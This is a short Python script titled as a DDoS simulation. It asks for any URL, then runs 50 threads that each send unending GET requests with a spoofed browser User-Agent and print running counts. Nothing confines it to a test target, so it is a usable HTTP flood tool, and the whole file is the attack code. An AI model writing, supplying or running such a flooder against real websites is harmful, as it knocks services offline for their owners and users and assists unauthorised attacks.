# Simulate a DDoS attack script.

import requests
import threading

url = input("Enter a url (include http:// or https://): ")

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}

def DDoS():
    attack_num = 0
    while True:
        attack_num += 1
        req = requests.get(url,headers=headers)
        print(f"requests: {attack_num} and status code: {req.status_code}")


for i in range(50):
    thread = threading.Thread(target=DDoS)
    thread.start()
